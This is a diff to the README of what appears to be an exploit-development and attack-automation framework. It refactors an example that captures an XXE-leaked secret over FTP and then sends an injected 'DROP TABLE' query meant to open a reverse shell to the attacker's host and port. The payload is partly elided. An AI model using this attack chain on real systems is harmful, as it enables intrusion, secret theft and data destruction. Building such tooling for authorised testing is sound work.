@@ -7,11 +7,15 @@
 This framework was created in order to simplify attack automation and exploit development. All you have to do is, for example:
 
 ```python
-async def reverse_shell(scenario):
-    await scenario.http_post(
-        'http://{rhost}:{rport}/query/'.format(**scenario.context),
-        'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**scenario.context),
-    )
+class ReverseShell(scenarios.Scene):
+
+    async def task(self):
+        """Wait for `xxe` state triggered when remote client connects via FTP and sends the secret"""
+
+        await self.http_post(
+            'http://{rhost}:{rport}/query/'.format(**self.context),
+            'secret={secret}&query=DROP+TABLE+IF+EXISTS+[...]{lhost}+{lport_reverse}'.format(**self.context)
+        )
 
 context = {
     'rhost': '127.0.0.1',
@@ -20,14 +24,14 @@ context = {
     'lport_reverse': 4444,
 }
 
+ftpd = services.FTPReader()
+ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
+
 story = scenarios.Scenario(**context)
 story.set_debug()
 story.set_proxy('http://127.0.0.1:8080')
-
-ftpd = services.FTPReader(story)
-ftpd.add_event('xxe', when=events.DataMatch(r'.+SecretKey=(.+);', bucket='secret'))
-
-story.add_scene(reverse_shell, when='xxe')
+story.add_service(ftpd)
+story.add_scene(ReverseShell, when='xxe')
 story.play()
 ```
 
